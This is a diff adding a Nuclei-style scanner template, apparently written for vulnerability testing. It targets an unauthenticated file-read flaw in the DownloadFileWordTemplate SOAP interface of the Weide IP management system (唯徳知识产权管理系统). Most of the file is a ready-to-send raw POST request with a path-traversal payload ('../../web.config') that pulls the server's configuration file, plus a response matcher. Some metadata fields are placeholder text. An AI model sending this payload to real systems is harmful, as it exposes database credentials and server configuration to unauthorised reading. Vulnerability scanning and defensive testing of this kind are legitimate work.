@@ -1,0 +1,32 @@
+id: wdzs-WSFM-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 唯徳知识产权管理系统 DownloadFileWordTemplate 接口存在文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%94%AF%E5%BE%B3%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%94%AF%E5%BE%B3%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDownloadFileWordTemplate%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /AutoUpdate/WSFM.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 396
+        SOAPAction: "http://tempuri.org/DownloadFileWordTemplate"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <DownloadFileWordTemplate xmlns="http://tempuri.org/">
+              <fileName>../../web.config</fileName>
+            </DownloadFileWordTemplate>
+          </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
+#结果为 base64编码。
